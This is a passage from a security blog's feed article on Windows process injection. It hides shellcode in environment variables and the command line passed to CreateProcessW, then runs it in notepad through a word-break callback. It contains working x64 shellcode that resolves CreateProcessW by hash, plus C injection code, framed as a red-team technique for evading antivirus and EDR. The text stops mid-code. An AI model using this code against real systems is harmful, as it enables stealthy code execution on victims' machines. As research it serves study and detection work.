                    "value": "<p>Windows Process Injection: Command Line and Environment Variables</p>\n<h2>Contents</h2>\n<ol>\n<li><a href=\"https://modexp.wordpress.com/feed/#intro\">Introduction</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#shellcode\">Shellcode</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#env\">Environment Variables</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#cmd\">Command Line</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#win\">Window Title</a></li>\n<li><a href=\"https://modexp.wordpress.com/feed/#runtime\">Runtime Data</a></li>\n</ol>\n<h2 id=\"intro\">1. Introduction</h2>\n<p>There are many ways to load shellcode into the address space of a process, but knowing precisely where it&#8217;s stored in memory is a bigger problem when we need to execute it. Ideally, a Red Teamer will want to locate their code with the least amount of effort, avoiding memory scrapers/scanners that might alert an antivirus or EDR solution. <a href=\"https://twitter.com/Hexacorn\">Adam</a> discussed some ways to avoid using <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex\">VirtualAllocEx</a> and <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory\">WriteProcessMemory</a> in a blog post, <a href=\"https://www.hexacorn.com/blog/2019/05/18/inserting-data-into-other-processes-address-space/\">Inserting data into other processes\u2019 address space</a>. Red Teamers are known to create a new process before injecting data, but I&#8217;ve yet to see any examples of using the command line or environment variables to assist with this.</p>\n<p>This post examines how <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw\">CreateProcessW</a> might be used to both start a new process AND inject data simultaneously. Memory for where the data resides will initially have Read-Write (RW) permissions, but this can be changed to Read-Write-Execute (RWX) using <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex\">VirtualProtectEx</a>. Since notepad will be used to demonstrate these techniques, <a href=\"https://www.hexacorn.com/blog/2019/04/23/wordwarper-new-code-injection-trick/\">Wordwarping</a> / <a href=\"https://docs.microsoft.com/en-us/windows/win32/controls/em-setwordbreakproc\">EM_SETWORDBREAKPROC</a> is used to execute the shellcode. The main structure of memory being modified for these examples is <a href=\"https://www.vergiliusproject.com/kernels/x64/Windows%20Vista%20%7C%202008/RTM/_RTL_USER_PROCESS_PARAMETERS\">RTL_USER_PROCESS_PARAMETERS</a> that contains the Environment block, the CommandLine and C RuntimeData information, all of which can be controlled by an actor prior to creation of a new process.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #800000; font-weight: bold;\">typedef</span> <span style=\"color: #800000; font-weight: bold;\">struct</span> _RTL_USER_PROCESS_PARAMETERS <span style=\"color: #800080;\">{</span>\n    <span style=\"color: #603000;\">ULONG</span> MaximumLength<span style=\"color: #800080;\">;</span>                            <span style=\"color: #696969;\">//0x0</span>\n    <span style=\"color: #603000;\">ULONG</span> Length<span style=\"color: #800080;\">;</span>                                   <span style=\"color: #696969;\">//0x4</span>\n    <span style=\"color: #603000;\">ULONG</span> Flags<span style=\"color: #800080;\">;</span>                                    <span style=\"color: #696969;\">//0x8</span>\n    <span style=\"color: #603000;\">ULONG</span> DebugFlags<span style=\"color: #800080;\">;</span>                               <span style=\"color: #696969;\">//0xc</span>\n    <span style=\"color: #603000;\">PVOID</span> ConsoleHandle<span style=\"color: #800080;\">;</span>                            <span style=\"color: #696969;\">//0x10</span>\n    <span style=\"color: #603000;\">ULONG</span> ConsoleFlags<span style=\"color: #800080;\">;</span>                             <span style=\"color: #696969;\">//0x18</span>\n    <span style=\"color: #603000;\">PVOID</span> StandardInput<span style=\"color: #800080;\">;</span>                            <span style=\"color: #696969;\">//0x20</span>\n    <span style=\"color: #603000;\">PVOID</span> StandardOutput<span style=\"color: #800080;\">;</span>                           <span style=\"color: #696969;\">//0x28</span>\n    <span style=\"color: #603000;\">PVOID</span> StandardError<span style=\"color: #800080;\">;</span>                            <span style=\"color: #696969;\">//0x30</span>\n    CURDIR CurrentDirectory<span style=\"color: #800080;\">;</span>                        <span style=\"color: #696969;\">//0x38</span>\n    UNICODE_STRING DllPath<span style=\"color: #800080;\">;</span>                         <span style=\"color: #696969;\">//0x50</span>\n    UNICODE_STRING ImagePathName<span style=\"color: #800080;\">;</span>                   <span style=\"color: #696969;\">//0x60</span>\n    UNICODE_STRING CommandLine<span style=\"color: #800080;\">;</span>                     <span style=\"color: #696969;\">//0x70</span>\n    <span style=\"color: #603000;\">PVOID</span> Environment<span style=\"color: #800080;\">;</span>                              <span style=\"color: #696969;\">//0x80</span>\n    <span style=\"color: #603000;\">ULONG</span> StartingX<span style=\"color: #800080;\">;</span>                                <span style=\"color: #696969;\">//0x88</span>\n    <span style=\"color: #603000;\">ULONG</span> StartingY<span style=\"color: #800080;\">;</span>                                <span style=\"color: #696969;\">//0x8c</span>\n    <span style=\"color: #603000;\">ULONG</span> CountX<span style=\"color: #800080;\">;</span>                                   <span style=\"color: #696969;\">//0x90</span>\n    <span style=\"color: #603000;\">ULONG</span> CountY<span style=\"color: #800080;\">;</span>                                   <span style=\"color: #696969;\">//0x94</span>\n    <span style=\"color: #603000;\">ULONG</span> CountCharsX<span style=\"color: #800080;\">;</span>                              <span style=\"color: #696969;\">//0x98</span>\n    <span style=\"color: #603000;\">ULONG</span> CountCharsY<span style=\"color: #800080;\">;</span>                              <span style=\"color: #696969;\">//0x9c</span>\n    <span style=\"color: #603000;\">ULONG</span> FillAttribute<span style=\"color: #800080;\">;</span>                            <span style=\"color: #696969;\">//0xa0</span>\n    <span style=\"color: #603000;\">ULONG</span> WindowFlags<span style=\"color: #800080;\">;</span>                              <span style=\"color: #696969;\">//0xa4</span>\n    <span style=\"color: #603000;\">ULONG</span> ShowWindowFlags<span style=\"color: #800080;\">;</span>                          <span style=\"color: #696969;\">//0xa8</span>\n    UNICODE_STRING WindowTitle<span style=\"color: #800080;\">;</span>                     <span style=\"color: #696969;\">//0xb0</span>\n    UNICODE_STRING DesktopInfo<span style=\"color: #800080;\">;</span>                     <span style=\"color: #696969;\">//0xc0</span>\n    UNICODE_STRING ShellInfo<span style=\"color: #800080;\">;</span>                       <span style=\"color: #696969;\">//0xd0</span>\n    UNICODE_STRING RuntimeData<span style=\"color: #800080;\">;</span>                     <span style=\"color: #696969;\">//0xe0</span>\n    RTL_DRIVE_LETTER_CURDIR CurrentDirectores<span style=\"color: #808030;\">[</span><span style=\"color: #008c00;\">32</span><span style=\"color: #808030;\">]</span><span style=\"color: #800080;\">;</span>  <span style=\"color: #696969;\">//0xf0</span>\n    <span style=\"color: #603000;\">ULONG</span> EnvironmentSize<span style=\"color: #800080;\">;</span>                          <span style=\"color: #696969;\">//0x3f0</span>\n<span style=\"color: #800080;\">}</span> RTL_USER_PROCESS_PARAMETERS<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">*</span>PRTL_USER_PROCESS_PARAMETERS<span style=\"color: #800080;\">;</span> \n</pre>\n<p><!--Created using ToHtml.com on 2020-07-31 01:20:01 UTC --></p>\n<h2 id=\"shellcode\">2. Shellcode</h2>\n<p>User-supplied shellcodes that contain two consecutive null bytes (\\x00\\x00) would require an encoder and decoder, such as Base64. <a href=\"https://github.com/odzhan/injection/blob/master/cmdline/winexec1.asm\">The following code</a> resolves the address of CreateProcessW and executes a command supplied by the word break callback. The PoC will set the command using <a href=\"https://docs.microsoft.com/en-us/windows/win32/winmsg/wm-settext\">WM_SETTEXT</a>.</p>\n<pre style=\"color: #000000; background: #ffffff;\">      <span style=\"color: #004a43;\">bits</span> <span style=\"color: #008c00;\">64</span>\n      \n<span style=\"color: #004a43;\">&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style=\"color: #004a43;\">%include</span><span style=\"color: #004a43;\"> \"include.inc\"</span>\n      \n      <span style=\"color: #004a43;\">struc</span> stk_mem\n        .hs                   <span style=\"color: #800000; font-weight: bold;\">resb</span> home_space_size\n        \n        .bInheritHandles      <span style=\"color: #800000; font-weight: bold;\">resq</span> <span style=\"color: #008c00;\">1</span>\n        .dwCreationFlags      <span style=\"color: #800000; font-weight: bold;\">resq</span> <span style=\"color: #008c00;\">1</span>\n        .lpEnvironment        <span style=\"color: #800000; font-weight: bold;\">resq</span> <span style=\"color: #008c00;\">1</span>\n        .lpCurrentDirectory   <span style=\"color: #800000; font-weight: bold;\">resq</span> <span style=\"color: #008c00;\">1</span>\n        .lpStartupInfo        <span style=\"color: #800000; font-weight: bold;\">resq</span> <span style=\"color: #008c00;\">1</span>\n        .lpProcessInformation <span style=\"color: #800000; font-weight: bold;\">resq</span> <span style=\"color: #008c00;\">1</span>\n        \n        .procinfo             <span style=\"color: #800000; font-weight: bold;\">resb</span> PROCESS_INFORMATION_size\n        .startupinfo          <span style=\"color: #800000; font-weight: bold;\">resb</span> STARTUPINFO_size\n      <span style=\"color: #004a43;\">endstruc</span>\n\n<span style=\"color: #004a43;\">&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style=\"color: #004a43;\">%define</span><span style=\"color: #004a43;\"> stk_size ((stk_mem_size + 15) &amp; -16) - 8</span>\n      \n<span style=\"color: #004a43;\">&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style=\"color: #004a43;\">%ifndef</span><span style=\"color: #004a43;\"> BIN</span>\n        <span style=\"color: #004a43;\">global</span> createproc\n<span style=\"color: #004a43;\">&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;&#xa0;</span><span style=\"color: #004a43;\">%endif</span>\n      \n      <span style=\"color: #696969;\">; void createproc(WCHAR cmd[]);</span>\n<span style=\"color: #e34adc;\">createproc:</span>\n      <span style=\"color: #696969;\">; save non-volatile registers</span>\n      pushx  rsi<span style=\"color: #808030;\">,</span> rbx<span style=\"color: #808030;\">,</span> rdi<span style=\"color: #808030;\">,</span> rbp\n      \n      <span style=\"color: #696969;\">; allocate stack memory for arguments + home space</span>\n      <span style=\"color: #800000; font-weight: bold;\">xor</span>    <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">eax</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> stk_size\n      <span style=\"color: #800000; font-weight: bold;\">sub</span>    rsp<span style=\"color: #808030;\">,</span> rax\n      \n      <span style=\"color: #696969;\">; save pointer to buffer</span>\n      <span style=\"color: #800000; font-weight: bold;\">push</span>   rcx\n      \n      <span style=\"color: #800000; font-weight: bold;\">push</span>   TEB.ProcessEnvironmentBlock\n      <span style=\"color: #800000; font-weight: bold;\">pop</span>    r1<span style=\"color: #008c00;\">1</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    rax<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">gs</span><span style=\"color: #808030;\">:</span>r1<span style=\"color: #008c00;\">1</span><span style=\"color: #808030;\">]</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    rax<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">+</span>PEB.Ldr<span style=\"color: #808030;\">]</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    rdi<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">+</span>PEB_LDR_DATA.InLoadOrderModuleList <span style=\"color: #808030;\">+</span> LIST_ENTRY.Flink<span style=\"color: #808030;\">]</span>\n      <span style=\"color: #800000; font-weight: bold;\">jmp</span>    <span style=\"color: #e34adc;\">scan_dll</span>\n<span style=\"color: #e34adc;\">next_dll:</span>    \n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    rdi<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span>rdi<span style=\"color: #808030;\">+</span>LDR_DATA_TABLE_ENTRY.InLoadOrderLinks <span style=\"color: #808030;\">+</span> LIST_ENTRY.Flink<span style=\"color: #808030;\">]</span>\n<span style=\"color: #e34adc;\">scan_dll:</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    rbx<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span>rdi<span style=\"color: #808030;\">+</span>LDR_DATA_TABLE_ENTRY.DllBase<span style=\"color: #808030;\">]</span>\n\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">esi</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span>rbx<span style=\"color: #808030;\">+</span>IMAGE_DOS_HEADER.e_lfanew<span style=\"color: #808030;\">]</span>\n      <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #000080;\">esi</span><span style=\"color: #808030;\">,</span> r11d             <span style=\"color: #696969;\">; add 60h or TEB.ProcessEnvironmentBlock</span>\n      <span style=\"color: #696969;\">; ecx = IMAGE_DATA_DIRECTORY[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">ecx</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span>rbx<span style=\"color: #808030;\">+</span>rsi<span style=\"color: #808030;\">+</span>IMAGE_NT_HEADERS.OptionalHeader <span style=\"color: #808030;\">+</span> \\\n                           IMAGE_OPTIONAL_HEADER.DataDirectory <span style=\"color: #808030;\">+</span> \\\n                           IMAGE_DIRECTORY_ENTRY_EXPORT <span style=\"color: #808030;\">*</span> IMAGE_DATA_DIRECTORY_size <span style=\"color: #808030;\">+</span> \\\n                           IMAGE_DATA_DIRECTORY.VirtualAddress <span style=\"color: #808030;\">-</span> \\\n                           TEB.ProcessEnvironmentBlock<span style=\"color: #808030;\">]</span>\n      <span style=\"color: #800000; font-weight: bold;\">jecxz</span>  <span style=\"color: #e34adc;\">next_dll</span>              <span style=\"color: #696969;\">; if no exports, try next DLL in list</span>\n      <span style=\"color: #696969;\">; rsi = offset IMAGE_EXPORT_DIRECTORY.Name </span>\n      <span style=\"color: #800000; font-weight: bold;\">lea</span>    rsi<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span>rbx<span style=\"color: #808030;\">+</span>rcx<span style=\"color: #808030;\">+</span>IMAGE_EXPORT_DIRECTORY.NumberOfNames<span style=\"color: #808030;\">]</span>\n      <span style=\"color: #800000; font-weight: bold;\">lodsd</span>                        <span style=\"color: #696969;\">; eax = NumberOfNames</span>\n      <span style=\"color: #800000; font-weight: bold;\">xchg</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">ecx</span>\n      <span style=\"color: #800000; font-weight: bold;\">jecxz</span>  <span style=\"color: #e34adc;\">next_dll</span>              <span style=\"color: #696969;\">; if no names, try next DLL in list</span>\n      \n      <span style=\"color: #696969;\">; r8 = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions</span>\n      <span style=\"color: #800000; font-weight: bold;\">lodsd</span>\n      <span style=\"color: #800000; font-weight: bold;\">xchg</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> r8d              <span style=\"color: #696969;\">;</span>\n      <span style=\"color: #800000; font-weight: bold;\">add</span>    r8<span style=\"color: #808030;\">,</span> rbx               <span style=\"color: #696969;\">; r8 = RVA2VA(r8, rbx)</span>\n      <span style=\"color: #696969;\">; ebp = IMAGE_EXPORT_DIRECTORY.AddressOfNames</span>\n      <span style=\"color: #800000; font-weight: bold;\">lodsd</span>\n      <span style=\"color: #800000; font-weight: bold;\">xchg</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">ebp</span>              <span style=\"color: #696969;\">;</span>\n      <span style=\"color: #800000; font-weight: bold;\">add</span>    rbp<span style=\"color: #808030;\">,</span> rbx              <span style=\"color: #696969;\">; rbp = RVA2VA(rbp, rbx)</span>\n      <span style=\"color: #696969;\">; r9 = IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals      </span>\n      <span style=\"color: #800000; font-weight: bold;\">lodsd</span>\n      <span style=\"color: #800000; font-weight: bold;\">xchg</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> r9d\n      <span style=\"color: #800000; font-weight: bold;\">add</span>    r9<span style=\"color: #808030;\">,</span> rbx               <span style=\"color: #696969;\">; r9 = RVA2VA(r9, rbx)</span>\n<span style=\"color: #e34adc;\">find_api:</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">esi</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">+</span>rcx<span style=\"color: #808030;\">*</span><span style=\"color: #008c00;\">4</span><span style=\"color: #008c00;\">-4</span><span style=\"color: #808030;\">]</span>    <span style=\"color: #696969;\">; rax = AddressOfNames[rcx-1]</span>\n      <span style=\"color: #800000; font-weight: bold;\">add</span>    rsi<span style=\"color: #808030;\">,</span> rbx\n      <span style=\"color: #800000; font-weight: bold;\">xor</span>    <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">eax</span>\n      <span style=\"color: #800000; font-weight: bold;\">cdq</span>\n<span style=\"color: #e34adc;\">hash_api:</span>\n      <span style=\"color: #800000; font-weight: bold;\">lodsb</span>\n      <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #000080;\">edx</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">eax</span>\n      <span style=\"color: #800000; font-weight: bold;\">ror</span>    <span style=\"color: #000080;\">edx</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">8</span>\n      <span style=\"color: #800000; font-weight: bold;\">dec</span>    <span style=\"color: #000080;\">al</span>\n      <span style=\"color: #800000; font-weight: bold;\">jns</span>    <span style=\"color: #e34adc;\">hash_api</span>\n      <span style=\"color: #800000; font-weight: bold;\">cmp</span>    <span style=\"color: #000080;\">edx</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x1b929a47</span>       <span style=\"color: #696969;\">; CreateProcessW</span>\n      <span style=\"color: #800000; font-weight: bold;\">loopne</span> <span style=\"color: #e34adc;\">find_api</span>              <span style=\"color: #696969;\">; loop until found or no names left</span>\n      \n      <span style=\"color: #800000; font-weight: bold;\">jnz</span>    <span style=\"color: #e34adc;\">next_dll</span>              <span style=\"color: #696969;\">; not found? goto next_dll</span>\n      \n      <span style=\"color: #800000; font-weight: bold;\">movzx</span>  <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">word</span><span style=\"color: #808030;\">[</span>r9<span style=\"color: #808030;\">+</span>rcx<span style=\"color: #808030;\">*</span><span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">]</span>   <span style=\"color: #696969;\">; eax = AddressOfNameOrdinals[rcx]</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span>r8<span style=\"color: #808030;\">+</span>rax<span style=\"color: #808030;\">*</span><span style=\"color: #008c00;\">4</span><span style=\"color: #808030;\">]</span>\n      <span style=\"color: #800000; font-weight: bold;\">add</span>    rbx<span style=\"color: #808030;\">,</span> rax              <span style=\"color: #696969;\">; rbx += AddressOfFunctions[rdx]</span>\n      \n      <span style=\"color: #696969;\">; CreateProcess(NULL, cmd, NULL, NULL, </span>\n      <span style=\"color: #696969;\">;   FALSE, 0, NULL, &amp;si, &amp;pi);</span>\n      <span style=\"color: #800000; font-weight: bold;\">pop</span>    rdx           <span style=\"color: #696969;\">; lpCommandLine = buffer for Edit</span>\n      <span style=\"color: #800000; font-weight: bold;\">xor</span>    r8<span style=\"color: #808030;\">,</span> r8        <span style=\"color: #696969;\">; lpProcessAttributes = NULL</span>\n      <span style=\"color: #800000; font-weight: bold;\">xor</span>    r9<span style=\"color: #808030;\">,</span> r9        <span style=\"color: #696969;\">; lpThreadAttributes = NULL</span>\n      <span style=\"color: #800000; font-weight: bold;\">xor</span>    <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">eax</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #808030;\">[</span>rsp<span style=\"color: #808030;\">+</span>stk_mem.bInheritHandles     <span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> rax <span style=\"color: #696969;\">; bInheritHandles      = FALSE</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #808030;\">[</span>rsp<span style=\"color: #808030;\">+</span>stk_mem.dwCreationFlags     <span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> rax <span style=\"color: #696969;\">; dwCreationFlags      = 0</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #808030;\">[</span>rsp<span style=\"color: #808030;\">+</span>stk_mem.lpEnvironment       <span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> rax <span style=\"color: #696969;\">; lpEnvironment        = NULL</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #808030;\">[</span>rsp<span style=\"color: #808030;\">+</span>stk_mem.lpCurrentDirectory  <span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> rax <span style=\"color: #696969;\">; lpCurrentDirectory   = NULL</span>\n      \n      <span style=\"color: #800000; font-weight: bold;\">lea</span>    rdi<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span>rsp<span style=\"color: #808030;\">+</span>stk_mem.procinfo       <span style=\"color: #808030;\">]</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #808030;\">[</span>rsp<span style=\"color: #808030;\">+</span>stk_mem.lpProcessInformation<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> rdi <span style=\"color: #696969;\">; lpProcessInformation = &amp;pi</span>\n\n      <span style=\"color: #800000; font-weight: bold;\">lea</span>    rdi<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">[</span>rsp<span style=\"color: #808030;\">+</span>stk_mem.startupinfo    <span style=\"color: #808030;\">]</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #808030;\">[</span>rsp<span style=\"color: #808030;\">+</span>stk_mem.lpStartupInfo       <span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> rdi <span style=\"color: #696969;\">; lpStartupInfo        = &amp;si</span>\n      \n      <span style=\"color: #800000; font-weight: bold;\">xor</span>    <span style=\"color: #000080;\">ecx</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">ecx</span>\n      <span style=\"color: #800000; font-weight: bold;\">push</span>   STARTUPINFO_size\n      <span style=\"color: #800000; font-weight: bold;\">pop</span>    rax\n      <span style=\"color: #800000; font-weight: bold;\">stosd</span>                         <span style=\"color: #696969;\">; si.cb = sizeof(STARTUPINFO)</span>\n      <span style=\"color: #800000; font-weight: bold;\">sub</span>    rax<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">4</span>\n      <span style=\"color: #800000; font-weight: bold;\">xchg</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">ecx</span>\n      <span style=\"color: #800000; font-weight: bold;\">rep</span>    <span style=\"color: #800000; font-weight: bold;\">stosb</span>\n      <span style=\"color: #800000; font-weight: bold;\">call</span>   <span style=\"color: #e34adc;\">rbx</span>\n      \n      <span style=\"color: #696969;\">; deallocate stack</span>\n      <span style=\"color: #800000; font-weight: bold;\">xor</span>    <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">eax</span>\n      <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> stk_size\n      <span style=\"color: #800000; font-weight: bold;\">add</span>    rsp<span style=\"color: #808030;\">,</span> rax\n      <span style=\"color: #800000; font-weight: bold;\">xor</span>    <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">eax</span>\n      \n      <span style=\"color: #696969;\">; restore non-volatile registers</span>\n      popx   rsi<span style=\"color: #808030;\">,</span> rbx<span style=\"color: #808030;\">,</span> rdi<span style=\"color: #808030;\">,</span> rbp  \n      <span style=\"color: #800000; font-weight: bold;\">ret</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-31 00:19:33 UTC --></p>\n<h2 id=\"env\">3. Environment Variables</h2>\n<p>Part of Unix since 1979 and MS-DOS/Windows since 1982. According to MSDN, the maximum size of a user-defined variable is 32,767 characters. 32KB should be sufficient for most shellcode, but if not, you have the option of using multiple variables for anything else.</p>\n<p>There&#8217;s a few ways to inject using variables, but I found the easiest approach to be setting one in the current process with <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setenvironmentvariable\">SetEnvironmentVariable</a>, and then allowing CreateProcessW to transfer or propagate all of them to the new process by setting the <var>lpEnvironment</var> parameter to NULL.</p>\n<pre style=\"color: #000000; background: #ffffff;\">    <span style=\"color: #696969;\">// generate random name</span>\n    <span style=\"color: #603000;\">srand</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">time</span><span style=\"color: #808030;\">(</span><span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800000; font-weight: bold;\">for</span><span style=\"color: #808030;\">(</span>i<span style=\"color: #808030;\">=</span><span style=\"color: #008c00;\">0</span><span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">&lt;</span>MAX_NAME_LEN<span style=\"color: #800080;\">;</span> i<span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">+</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">{</span>\n      name<span style=\"color: #808030;\">[</span>i<span style=\"color: #808030;\">]</span> <span style=\"color: #808030;\">=</span> <span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">rand</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">%</span> <span style=\"color: #008c00;\">2</span><span style=\"color: #808030;\">)</span> <span style=\"color: #800080;\">?</span> <span style=\"color: #0000e6;\">L'a'</span> <span style=\"color: #800080;\">:</span> <span style=\"color: #0000e6;\">L'A'</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">+</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">rand</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">)</span> <span style=\"color: #808030;\">%</span> <span style=\"color: #008c00;\">26</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    <span style=\"color: #800080;\">}</span>\n    \n    <span style=\"color: #696969;\">// set variable in this process space with our shellcode</span>\n    <span style=\"color: #400000;\">SetEnvironmentVariable</span><span style=\"color: #808030;\">(</span>name<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">(</span><span style=\"color: #603000;\">PWCHAR</span><span style=\"color: #808030;\">)</span>WINEXEC<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #696969;\">// create a new process using </span>\n    <span style=\"color: #696969;\">// environment variables from this process</span>\n    <span style=\"color: #400000;\">ZeroMemory</span><span style=\"color: #808030;\">(</span><span style=\"color: #808030;\">&amp;</span>si<span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>si<span style=\"color: #808030;\">)</span><span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>cb          <span style=\"color: #808030;\">=</span> <span style=\"color: #800000; font-weight: bold;\">sizeof</span><span style=\"color: #808030;\">(</span>si<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>dwFlags     <span style=\"color: #808030;\">=</span> STARTF_USESHOWWINDOW<span style=\"color: #800080;\">;</span>\n    si<span style=\"color: #808030;\">.</span>wShowWindow <span style=\"color: #808030;\">=</span> <span style=\"color: #7d0045;\">SW_SHOWDEFAULT</span><span style=\"color: #800080;\">;</span>\n    \n    <span style=\"color: #400000;\">CreateProcess</span><span style=\"color: #808030;\">(</span><span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000;\">L\"</span><span style=\"color: #0000e6;\">notepad</span><span style=\"color: #800000;\">\"</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> \n      FALSE<span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #7d0045;\">NULL</span><span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>si<span style=\"color: #808030;\">,</span> <span style=\"color: #808030;\">&amp;</span>pi<span style=\"color: #808030;\">)</span><span style=\"color: #800080;\">;</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-31 00:46:52 UTC --></p>\n<p>Variable names are stored in memory alphabetically and will appear in the same order for the new process so long as <var>lpEnvironment</var> for CreateProcess is set to NULL. The PoC here will locate the address of the shellcode inside the current environment block, then subtract the base address to obtain the relative virtual address (RVA).</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #696969;\">// return relative virtual address of environment 